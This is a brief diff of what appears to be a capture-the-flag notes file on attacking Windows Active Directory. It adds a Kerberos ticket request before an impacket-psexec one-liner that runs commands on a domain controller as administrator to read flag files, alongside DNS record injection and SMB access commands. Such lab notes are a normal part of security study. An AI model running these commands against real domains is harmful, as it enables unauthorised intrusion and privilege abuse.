@@ -158,7 +158,7 @@ dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP 
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 
 ## ROOT FLAG
-export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
 
 ## Start Bloodhound
 Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
